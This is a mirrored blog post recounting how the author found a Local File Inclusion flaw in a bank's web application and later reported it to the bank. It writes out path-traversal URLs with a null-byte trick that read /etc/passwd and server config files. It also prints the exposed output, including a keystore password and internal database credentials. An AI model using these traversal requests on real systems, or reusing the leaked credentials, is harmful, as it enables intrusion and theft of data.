<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Story of single penetration</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Topics about hacker fishing made me write this post. 

 I want to share with you a story that happened to me several years ago. 

 I must say, my hobb...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">🔎</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">📜</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">⬆️</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">⬇️</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Story of single penetration</h1><div class="post__text post__text-html js-mediator-article">  Topics about hacker fishing made me write this post. <br><br>  I want to share with you a story that happened to me several years ago. <br><br>  I must say, my hobby is web application security. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      By chance walking on the internet, my friend found a website for sending free sms to numbers of Ukrainian operators.  There we found a small vulnerability associated with the circumvention of the Turing test (captcha). <br>  Since my friend and I love to look for vulnerabilities, we played a game, the meaning of which, which of us will quickly pass the captcha. <br>  But today the story is not about that, but about what was further discovered by us. <br><br><a name="habracut"></a><br><br>  Once, my friend, looking through the source code of the page of the site for sending free sms, found an interesting HTML code: <br><blockquote><code><a href="http://www.sms1.ua/img/topupeasy.jpg%2522"></a> <font color="#008000"><strong>&lt;A</strong></font> <font color="#7D9029">HREF=</font> <font color="#BA2121">"#"</font> <font color="#7D9029">onClick=</font> <font color="#BA2121">"javascript:window.open('https://hackbank.ua/test.php?code=MOBILE&amp;state=2&amp;xslt_url=service_host.xsl', ' 'quickpay','toolbar=0,status=0,menubar=0,scrollbars=0,width=650,height=400',false);"</font> <font color="#7D9029">CLASS=</font> <font color="#BA2121">"header"</font> <font color="#008000"><strong>&gt;&lt;IMG</strong></font> <font color="#7D9029">SRC=</font> <font color="#BA2121">"www.sms1.ua/img/topupeasy.jpg"</font> <font color="#7D9029">WIDTH=</font> <font color="#BA2121">"82"</font> <br> <font color="#7D9029">HEIGHT=</font> <font color="#BA2121">"34"</font> <font color="#7D9029">ALT=</font> <font color="#BA2121">" !"</font> <font color="#7D9029">BORDER=</font> <font color="#BA2121">"0"</font> <font color="#7D9029">VSPACE=</font> <font color="#BA2121">"0"</font> <font color="#008000"><strong>&gt;&lt;/A&gt;</strong></font> <br></code> </blockquote><br><br>  The link that logically should download the file to the computer was very interesting for us. <br><br>  In less than 5 minutes, we discovered the <b>Local File Inclusion</b> vulnerability. <br><br>  The vulnerability was in the following link: <br><br><blockquote> <code><a href="https://hackbank.ua/test.php%3Fcode%3DMOBILE%26state%3D2%26xslt_url%3D"></a> hackbank.ua/test.php?code=MOBILE&amp;state=2&amp;xslt_url= <font color="#008000"><strong>&lt;local</strong></font> <font color="#7D9029">_file</font> <font color="#008000"><strong>&gt;</strong></font> <br></code> </blockquote><br><br>  With this vulnerability, you can read local files directly in the browser. <br><br>  We made a request to the server for a non-existent file, and this is what we received: <br><br>  Request for url: <br><blockquote> <code><a href="https://hackbank.ua/test%3F%26xslt_url%3D0"></a> hackbank.ua/test?&amp;xslt_url=0 <br></code> </blockquote><br><br>  The server response was something like this: <br><blockquote> <code>500 Servlet Exception <br> <br> ........................... <br> <br> Resin-3.0.s060216 (built Thu, 16 Feb 2006 09:17:50 PST) <br></code> <br></blockquote><br><br>  Honestly, the first time I heard about Resin <br>  And <b>Resin</b> is a high-performance application server that includes features such as scalability and load distribution. <br><br>  Product information that we were able to find out on Wikipedia at the time: <br><br> <code><a href="http://www.caucho.com/"></a> <a href="http://ru.wikipedia.org/wiki/Resin"></a>   Caucho Technology, Inc. <br>    <br>  Caucho Technology, Inc. <br>     <br>   3.1.1 —  2007 <br>  GPL   <br>  www.caucho.com (.) <br> <br>    <br></code> <br><br>  After downloading this software, we started to study it. <br><br>  And so, the Resin software folder structure: <br><br><blockquote> <code><font color="#808080">¦   configure <br> ¦   httpd.exe <br> ¦   LICENSE <br> ¦   Makefile.in <br> ¦   README <br> ¦   setup.exe <br> ¦ <br> +---automake <br> ¦       config.guess <br> ¦       config.sub <br> ¦       install-sh <br> ¦       ltmain.sh <br> ¦       missing <br> ¦ <br> +---bin <br> ¦       httpd.sh <br> ¦ <br> +---conf <br> ¦       app-default.xml <br> ¦       development.conf <br> ¦       fine.conf <br> ¦       minimal.conf <br> ¦       password.xml <br> ¦       resin-3_1.conf <br> ¦       resin-admin.xml <br> ¦       resin.conf <br> ¦ <br> +---contrib <br> ¦       init.resin-iptables <br> ¦       init.resin.in <br> ¦ <br> +---lib <br> ¦       activation.jar <br> ¦       eclipse-compil <br> <br></font> <br> <br></code> <br></blockquote><br><br>  Now let's go back to the vulnerability. <br><br>  Let's start with the classics: <br>  Under the link <a href="https://hackbank.ua/test%3Fxslt_url%3D../../../../../../etc/passwd">hackbank.ua/test?xslt_url=../../../../../../etc/passwd</a> <br><br>  we get this conclusion: <br><br><blockquote> <code>root:x:0:0:root:/root:/bin/bash <br> bin:x:1:1:bin:/bin:/sbin/nologin <br> daemon:x:2:2:daemon:/sbin:/sbin/nologin <br> adm:x:3:4:adm:/var/adm:/sbin/nologin <br> lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin <br> sync:x:5:0:sync:/sbin:/bin/sync <br> shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown <br> halt:x:7:0:halt:/sbin:/sbin/halt <br> mail:x:8:12:mail:/var/spool/mail:/sbin/nologin <br> news:x:9:13:news:/etc/news: <br> uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin <br> operator:x:11:0:operator:/root:/sbin/nologin <br> games:x:12:100:games:/usr/games:/sbin/nologin <br> gopher:x:13:30:gopher:/var/gopher:/sbin/nologin <br> ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin <br> nobody:x:99:99:Nobody:/:/sbin/nologin <br> vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin <br> rpm:x:37:37::/var/lib/rpm:/sbin/nologin <br> nscd:x:28:28:NSCD Daemon:/:/sbin/nologin <br> ident:x:100:101::/home/ident:/sbin/nologin <br> netdump:x:34:34:Network Crash Dump user:/var/crash:/bin/bash <br> sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin <br> rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin <br> rpcuser:x:29:29:RPC Servic <br></code> </blockquote><br><br>  Then we started looking for where the <i>Resin</i> server's <b>/ conf</b> folder is locally stored. <br>  And found quite quickly. <br>  The config is an XML file.  Which was available on the link <a href="https://hackbank.ua/test%3Fxslt_url%3D../../../../../../conf/resin.conf%2500">hackbank.ua/test?xslt_url=../../../../../../conf/resin.conf%00</a> <br><br><h6>  <u>% 00</u> is <b>null-byte</b> , telling the web server that this is the end of the line. </h6><br><br>  Next, we look at the source code of the resulting file. <br><blockquote> <code><a href="http://caucho.com/ns/resin/core%2522"></a> <a href="http://caucho.com/ns/resin%2522"></a> <font color="#BC7A00">&lt;?xml version="1.0" encoding="utf-8"?&gt;</font> <br> <font color="#008000"><strong>&lt;resin</strong></font> <font color="#7D9029">xmlns:resin=</font> <font color="#BA2121">"caucho.com/ns/resin/core"</font> <font color="#7D9029">xmlns=</font> <font color="#BA2121">"caucho.com/ns/resin"</font> <font color="#008000"><strong>&gt;</strong></font> <br> <font color="#008000"><strong>&lt;server&gt;</strong></font> <br> <font color="#008000"><strong>&lt;http</strong></font> <font color="#7D9029">port=</font> <font color="#BA2121">"1080"</font> <font color="#008000"><strong>/&gt;</strong></font> <br> <font color="#008000"><strong>&lt;http</strong></font> <font color="#7D9029">port=</font> <font color="#BA2121">"10443"</font> <font color="#008000"><strong>&gt;</strong></font> <br> <font color="#008000"><strong>&lt;jsse-ssl&gt;</strong></font> <br> <font color="#008000"><strong>&lt;key-store-type&gt;</strong></font> JKS <font color="#008000"><strong>&lt;/key-store-type&gt;</strong></font> <br> <font color="#008000"><strong>&lt;key-store-file&gt;</strong></font> keys/hackbank.jks <font color="#008000"><strong>&lt;/key-store-file&gt;</strong></font> <br> <font color="#008000"><strong>&lt;password&gt;</strong></font> fynbxfn <font color="#008000"><strong>&lt;/password&gt;</strong></font> <br> <font color="#008000"><strong>&lt;key-manager-factory&gt;</strong></font> 6645b <font color="#008000"><strong>&lt;/key-manager-factory&gt;</strong></font> <br> <font color="#008000"><strong>&lt;ssl-context&gt;</strong></font> SSL <font color="#008000"><strong>&lt;/ssl-context&gt;</strong></font> <br> <font color="#008000"><strong>&lt;/jsse-ssl&gt;</strong></font> <br> <font color="#008000"><strong>&lt;/http&gt;</strong></font> <br> <font color="#008000"><strong>&lt;host</strong></font> <font color="#7D9029">id=</font> <font color="#BA2121">""</font> <font color="#7D9029">root-directory=</font> <font color="#BA2121">"."</font> <font color="#008000"><strong>&gt;</strong></font> <br> <font color="#008000"><strong>&lt;access-log</strong></font> <font color="#7D9029">path=</font> <font color="#BA2121">"log/access.log"</font> <font color="#7D9029">format=</font> <font color="#BA2121">"%h %l %u %t &amp;quot;%r&amp;quot; %s %b &amp;quot;%i&amp;quot; &amp;quot;%i&amp;quot;"</font> <font color="#7D9029">rollover-period=</font> <font color="#BA2121">"1W"</font> <font color="#008000"><strong>/&gt;</strong></font> <br> <font color="#008000"><strong>&lt;stderr-log</strong></font> <font color="#7D9029">path=</font> <font color="#BA2121">"log/stderr.log"</font> <font color="#7D9029">timestamp=</font> <font color="#BA2121">"[%Y.%m.%d %H:%M:%S.%s] "</font> <font color="#7D9029">rollover-period=</font> <font color="#BA2121">"1W"</font> <font color="#008000"><strong>/&gt;</strong></font> <br> <font color="#008000"><strong>&lt;stdout-log</strong></font> <font color="#7D9029">path=</font> <font color="#BA2121">"log/stdout.log"</font> <font color="#7D9029">rollover-period=</font> <font color="#BA2121">"1W"</font> <font color="#008000"><strong>/&gt;</strong></font> <br> <font color="#008000"><strong>&lt;log</strong></font> <font color="#7D9029">path=</font> <font color="#BA2121">"log/server.log"</font> <font color="#7D9029">timestamp=</font> <font color="#BA2121">"[%Y.%m.%d %H:%M:%S.%s] "</font> <font color="#7D9029">rollover-period=</font> <font color="#BA2121">"1W"</font> <font color="#008000"><strong>/&gt;</strong></font> <br> <font color="#008000"><strong>&lt;web-app</strong></font> <font color="#7D9029">id=</font> <font color="#BA2121">"/"</font> <font color="#7D9029">document-directory=</font> <font color="#BA2121">"webapps/ROOT"</font> <font color="#008000"><strong>/&gt;</strong></font> <br> <font color="#008000"><strong>&lt;ear-deploy</strong></font> <font color="#7D9029">path=</font> <font color="#BA2121">"deploy"</font> <font color="#008000"><strong>&gt;</strong></font> <br> <font color="#008000"><strong>&lt;ear-default</strong></font> <font color="#7D9029">ejb-server-jndi-name=</font> <font color="#BA2121">"java:comp/env/ejb"</font> <font color="#008000"><strong>&gt;</strong></font> <br> <font color="#008000"><strong>&lt;ejb-server</strong></font> <font color="#7D9029">jndi-name=</font> <font color="#BA2121">"java:comp/env/ejb"</font> <font color="#008000"><strong>/&gt;</strong></font> <br> <font color="#008000"><strong>&lt;/ear-default&gt;</strong></font> <br> <font color="#008000"><strong>&lt;/ear-deploy&gt;</strong></font> <br> <font color="#008000"><strong>&lt;web-app-deploy</strong></font> <font color="#7D9029">path=</font> <font color="#BA2121">"webapps"</font> <font color="#008000"><strong>/&gt;</strong></font> <br> <font color="#008000"><strong>&lt;resource-deploy</strong></font> <font color="#7D9029">path=</font> <font color="#BA2121">"deploy"</font> <font color="#008000"><strong>/&gt;</strong></font> <br> <font color="#008000"><strong>&lt;web-app-deploy</strong></font> <font color="#7D9029">path=</font> <font color="#BA2121">"deploy"</font> <font color="#008000"><strong>/&gt;</strong></font> <br> <font color="#008000"><strong>&lt;/host&gt;</strong></font> <br> <font color="#008000"><strong>&lt;resin:import</strong></font> <font color="#7D9029">path=</font> <font color="#BA2121">"$/conf/db-pool.xml"</font> <font color="#008000"><strong>/&gt;</strong></font> <br> <font color="#008000"><strong>&lt;resin:import</strong></font> <font color="#7D9029">path=</font> <font color="#BA2121">"$/conf/c2b-db-pool.xml"</font> <font color="#008000"><strong>/&gt;</strong></font> <br> <font color="#008000"><strong>&lt;resin:import</strong></font> <font color="#7D9029">path=</font> <font color="#BA2121">"$/conf/db-pool-qp.xml"</font> <font color="#008000"><strong>/&gt;</strong></font> <br> <font color="#008000"><strong>&lt;resin:import</strong></font> <font color="#7D9029">path=</font> <font color="#BA2121">"$/conf/hb-default.xml"</font> <font color="#008000"><strong>/&gt;</strong></font> <br> <font color="#008000"><strong>&lt;resin:import</strong></font> <font color="#7D9029">path=</font> <font color="#BA2121">"$/conf/resin-status.xml"</font> <font color="#008000"><strong>/&gt;</strong></font> <br> <font color="#008000"><strong>&lt;/server&gt;</strong></font> <br> <font color="#008000"><strong>&lt;resin:import</strong></font> <font color="#7D9029">path=</font> <font color="#BA2121">"$/conf/resin-common.xml"</font> <font color="#008000"><strong>/&gt;</strong></font> <br> <font color="#008000"><strong>&lt;/resin&gt;</strong></font> <br></code> </blockquote><br><br>  Here are all the web server logs: <br><br><blockquote> <code><a href="https://hackbank.ua/test%3Fxslt_url%3D../../../../../../log/access.log"></a> <a href="https://hackbank.ua/test%3Fxslt_url%3D../../../../../../log/stderr.log"></a> <a href="https://hackbank.ua/test%3Fxslt_url%3D../../../../../../log/server.log"></a> hackbank.ua/test?xslt_url=../../../../../../log/access.log <br> hackbank.ua/test?xslt_url=../../../../../../log/stderr.log <br> hackbank.ua/test?xslt_url=../../../../../../log/server.log <br></code> </blockquote><br><br>  There we found nothing interesting.  But we went further :) <br><br>  File <i>../../../../../../conf/c2b-db-pool.xml%00</i> : <br><br><blockquote> <code>10.1.101.195:5000 <br> ----------------- <br> user     : C2BServer <br> password : vsirfysy <br> <br> 10.1.100.105:5000 <br> ----------------- <br> user     : C2BServer <br> password : lfktrbq,thtu <br> <br> 10.1.100.115:5000 <br> ---------------- <br> user     : jbkl <br> password :123456 <br></code> </blockquote><br><br>  File <i>../../../../../../conf/db-pool.xml%00</i> : <br><br><blockquote> <code>10.1.101.51:5000 <br> ------------------- <br> user     : 16_jag <br> password : u4BKoc7U5Edo <br> <br> 10.1.100.77:5000 <br> ------------------- <br> user     : hskl <br> password : hsklhskl <br> <br> 10.1.99.49:4100 <br> ------------------ <br> user     : wbpfo_p424 <br> password : aUKlOfcvT4YmAnk <br> <br> 10.1.99.82:5000 <br> ------------------ <br> user     : P24CVC <br> password : Login_4_P424CVC <br></code> </blockquote><br><br>  Guess what is it?  That's right, this is access to other servers on the internal network of the bank :) <br><br>  The next day, we wrote a letter, described all the vulnerabilities that we managed to find.  And they sent a letter to the bank post.  After 3 weeks, vulnerabilities were present.  We sent another letter, and after a week, we were fixed for the joy. <br><br>  We did not want to offend anyone with this article, we just want to convey to the world that there are no secure systems.  Hire professionals who will audit you information systems. <br><br>  For any questions, please contact vadim@g-sg.net <br><br><h6>  * Attention!  All links, as well as the name of the bank are changed for reasons of anonymity * </h6><br><br>  <b><i>Thanks for attention!</i></b> <br><br>  <b>UPD.</b>  <b>All errors in the text, write to private messages.</b>  <b>Thank!</b> </div><p>Source: <a href="https://habr.com/ru/post/86368/">https://habr.com/ru/post/86368/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../86361/index.html">About wonderful 3G</a></li>
<li><a href="../86362/index.html">Google statistics: where to download movies and music</a></li>
<li><a href="../86364/index.html">Test infected</a></li>
<li><a href="../86365/index.html">Opera Mini 5 beta 2 - now also for Windows Mobile</a></li>
<li><a href="../86367/index.html">How long will BTK fail?</a></li>
<li><a href="../86372/index.html">Prophet of 1995</a></li>
<li><a href="../86373/index.html">Does your program use a coherent list? Pay license fees</a></li>
<li><a href="../86376/index.html">Questions to Igor Danilov (author of Dr.Web anti-virus)</a></li>
<li><a href="../86378/index.html">LinguaLeo.ru - learning English online. Made in Thailand!</a></li>
<li><a href="../86381/index.html">Abstract and Final class at the same time in the Java programming language ?!</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>